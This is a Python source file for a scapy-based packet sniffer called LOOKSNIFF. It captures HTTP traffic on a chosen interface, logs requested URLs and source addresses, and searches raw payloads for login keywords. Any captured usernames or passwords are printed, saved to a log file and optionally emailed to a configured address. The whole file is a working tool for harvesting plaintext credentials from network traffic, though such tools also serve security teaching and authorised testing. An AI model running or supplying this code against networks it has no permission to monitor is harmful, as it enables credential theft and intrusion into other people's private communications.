import time
from colorama import Fore, Style
import scapy.all
from scapy.layers import http
import psutil
from prettytable import PrettyTable
import subprocess
import re
from scapy.layers.http import HTTPRequest
from scapy.layers.inet import IP
import threading
import smtplib
from email.mime.text import MIMEText
from plyer import notification

choice = "Y"
log_choice = "N"
alert_choice = "N"
log_file = "packet_logs.txt"
protocols = []

def write_to_log(data):
    if log_choice == "Y":
        with open(log_file, "a") as f:
            f.write(data + "\n")

def send_email_alert(message):
    try:
        from_address = "your_email@example.com"
        to_address = "recipient_email@example.com"
        subject = "Sensitive Information Detected"
        msg = MIMEText(message)
        msg["Subject"] = subject
        msg["From"] = from_address
        msg["To"] = to_address

        server = smtplib.SMTP("smtp.example.com", 587)
        server.starttls()
        server.login("your_email@example.com", "your_password")
        server.sendmail(from_address, to_address, msg.as_string())
        server.quit()
    except Exception as e:
        print(f"Failed to send email: {e}")

def send_desktop_notification(message):
    notification.notify(
        title="Sensitive Information Detected",
        message=message,
        timeout=5
    )

def mac_address(interface):
    try:
        mac_out = subprocess.check_output(["ifconfig", interface], stderr=subprocess.STDOUT)
        match = re.search(r"\w\w:\w\w:\w\w:\w\w:\w\w:\w\w", str(mac_out))
        if match:
            return match.group(0)
        else:
            raise ValueError("MAC address not found")
    except subprocess.CalledProcessError as e:
        print(f"Failed to execute ifconfig {e.output}")
    except Exception as e:
        print(f"An error occurred: {e}")

def ip_address(interface):
    try:
        ip_out = subprocess.check_output(["ifconfig", interface], stderr=subprocess.STDOUT)
        out_string = ip_out.decode()
        ip_pattern = re.compile(r'inet (\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})')
        match = ip_pattern.search(out_string)
        if match:
            return match.group(1)
        else:
            raise ValueError("IP address not found in output")
    except subprocess.CalledProcessError as e:
        print(f"Failed to execute ifconfig {e.output.decode()}")
    except Exception as e:
        print(f"Error occurred {e}")

def ip_table():
    address = psutil.net_if_addrs()
    p = PrettyTable([f'{Fore.GREEN}Interface', 'Mac Address', f'Ip Address{Style.RESET_ALL}'])
    for b, c in address.items():
        mac = mac_address(b)
        ip = ip_address(b)
        if ip and mac:
            p.add_row([b, mac, ip])
        elif mac:
            p.add_row([b, mac, f"{Fore.RED}No IP address assigned{Style.RESET_ALL}"])
        elif ip:
            p.add_row([b, f"{Fore.RED}No MAC address assigned{Style.RESET_ALL}", ip])
    print(p)

def sniff(interface):
    filters = " or ".join(protocols)
    scapy.all.sniff(iface=interface, store=False, prn=psniffed_packet, filter=filters)

def psniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        log_entry = "[++] HTTP request <<<<<<<"
        print(log_entry)
        write_to_log(log_entry)
        url_extractor(packet)
        test = user_login_info(packet)
        if test:
            log_entry = f"{Fore.GREEN}[+] Username OR password is Sent >>>> {test}{Style.RESET_ALL}"
            print(log_entry)
            write_to_log(log_entry)
            if alert_choice == "Y":
                send_email_alert(test)
                send_desktop_notification(test)
        if choice == "Y" or choice == "y":
            raw_request(packet)

def user_login_info(packet):
    if packet.haslayer(scapy.all.Raw):
        load = packet[scapy.all.Raw].load
        try:
            load_decode = load.decode()
        except UnicodeDecodeError:
            return None
        keywords = ["username", "user", "email", "pass", "login", "password", "UserName", "Password"]
        for key in keywords:
            if key in load_decode:
                return load_decode
    return None

def url_extractor(packet):
    try:
        http_layer = packet.getlayer(HTTPRequest)
        ip_layer = packet.getlayer(IP)
        if http_layer and ip_layer:
            src_ip = ip_layer.fields.get('src', 'Unknown IP')
            method = http_layer.fields.get('Method', b'').decode()
            host = http_layer.fields.get('Host', b'').decode()
            path = http_layer.fields.get('Path', b'').decode()

            log_entry = f"{src_ip} just requested {method} {host} {path}"
            print(log_entry)
            write_to_log(log_entry)
    except AttributeError:
        log_entry = "Packet does not contain the required HTTP & IP layers."
        print(log_entry)
        write_to_log(log_entry)
    except Exception as e:
        log_entry = f"An error occurred: {e}"
        print(log_entry)
        write_to_log(log_entry)

def raw_request(packet):
    httpl = packet[HTTPRequest].fields

    print("-----------------***Raw HTTP Packet***-------------------")
    print("{:<40} {:<15}".format('Key', 'Label'))

    try:
        for a, b in httpl.items():
            try:
                label = b.decode()
            except (AttributeError, UnicodeDecodeError):
                label = str(b)
            log_entry = "{:<40} {:<15}".format(a, label)
            print(log_entry)
            write_to_log(log_entry)
    except KeyboardInterrupt:
        print("\n[+] Quitting Program...")

    print("---------------------------------------------------------")

def sniffm():
    print(r"""
              ╔╗╔═╦═╦╦╦══╦═╦╦╦═╦═╗
              ║╚╣║║║║═╬╗╚╣║║║║╔╣╔╝
              ╚═╩═╩═╩╩╩══╩╩═╩╩╝╚╝═""")
    print(f"{Fore.BLUE} Welcome To LOOKSNIFF Packet Sniffer{Style.RESET_ALL}")
    

    global choice, log_choice, alert_choice, protocols
    try:
        choice = input("[*] Do you want to print the raw Packet: Y/N: ").strip().upper()
        log_choice = input("[*] Do you want to store logs in a file: Y/N: ").strip().upper()
        alert_choice = input("[*] Do you want to receive alerts for sensitive information: Y/N: ").strip().upper()
        protocols = input("[*] Enter the protocols to sniff (e.g., tcp,udp,http): ").strip().lower().split(',')
        ip_table()
        interface = input("[*] Please enter the interface name: ").strip()
        print("[*] Sniffing Packets...")

        sniff(interface)
        
        print(f"{Fore.YELLOW}\n[*] Redirecting to Main Menu...{Style.RESET_ALL}")
        time.sleep(3)
    except KeyboardInterrupt:
        print(f"{Fore.RED}\n[!] Redirecting to Main Menu...{Style.RESET_ALL}")
        time.sleep(3)

sniffm()
